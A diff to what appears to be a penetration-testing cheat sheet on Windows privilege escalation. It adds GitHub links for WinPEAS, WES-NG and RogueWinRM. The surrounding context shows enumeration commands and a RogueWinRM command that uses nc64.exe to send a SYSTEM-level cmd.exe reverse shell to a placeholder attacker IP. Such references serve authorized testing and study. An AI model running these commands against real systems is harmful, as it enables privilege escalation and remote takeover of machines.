@@ -29,7 +29,8 @@ PS C:\> Invoke-PrivescCheck
 
 ## WinPEAS
 
-- **Enumeration Script**
+- <a class="button button--outline button--info" href="https://github.com/carlospolop/PEASS-ng">WinPEAS GitHub</a>
+- **Enumeration Script** 
 
 ```powershell
 C:\> winpeas.exe > <Output>
@@ -41,6 +42,7 @@ C:\> winpeas.exe > <Output>
 
 ## WES-NG [Windows Exploit Suggester - Next Generation]
 
+- <a class="button button--outline button--info" href="https://github.com/bitsadmin/wesng">WES-NG GitHub</a>
 - **Target**
 
 ```batch
@@ -57,6 +59,9 @@ C:\> systeminfo > <Output>
 ## RogueWinRM
 
 `RogueWinRM` is a **`Local Privilege`** Escalation Exploit that allows to Escalate from a **Service Account** with `SeImpersonatePrivilege` to Local System Account if WinRM Service is not Running **(Default on `Windows 10` but Not on `Windows Server 2019`).**
+
+
+- <a class="button button--outline button--info" href="https://github.com/antonioCoco/RogueWinRM">RogueWinRM GitHub</a>
 
 ```batch
 RogueWinRM.exe -p "C:\Tools\nc64.exe" -a "-e cmd.exe <ATTACKER_IP> <PORT>"
